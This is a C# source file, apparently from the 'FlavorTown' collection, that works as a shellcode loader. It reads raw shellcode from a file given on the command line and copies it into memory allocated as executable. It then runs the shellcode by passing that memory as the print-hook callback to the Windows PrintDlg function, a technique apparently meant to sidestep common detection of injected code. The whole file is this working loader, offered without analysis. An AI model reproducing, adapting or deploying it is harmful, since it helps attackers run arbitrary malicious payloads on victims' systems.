// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace PrintDlg
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: PrintDlg.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            uint PD_ENABLEPRINTHOOK = 0x00001000;

            PRINTDLG sPrintDlg = new PRINTDLG();
            sPrintDlg.lStructSize = (uint)Marshal.SizeOf(sPrintDlg);
            sPrintDlg.Flags = PD_ENABLEPRINTHOOK;
            sPrintDlg.lpfnPrintHook = hAlloc;

            PrintDlg(sPrintDlg);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("comdlg32.dll")]
        static extern bool PrintDlg([In,Out] PRINTDLG lppd);

        [StructLayout(LayoutKind.Sequential)]
        public class PRINTDLG
        {
            public uint lStructSize;
            public IntPtr hwndOwner;
            public IntPtr hDevMode;
            public IntPtr hDevNames;
            public IntPtr hDC;
            public uint Flags;
            public ushort nFromPage;
            public ushort nToPage;
            public ushort nMinPage;
            public ushort nMaxPage;
            public ushort nCopies;
            public IntPtr hInstance;
            public IntPtr lCustData;
            public IntPtr lpfnPrintHook;
            public IntPtr lpfnSetupHook;
            [MarshalAs(UnmanagedType.LPStr)]
            public string lpPrintTemplateName;
            [MarshalAs(UnmanagedType.LPStr)]
            public string lpSetupTemplateName;
            public IntPtr hPrintTemplate;
            public IntPtr hSetupTemplate;
        }
    }
}
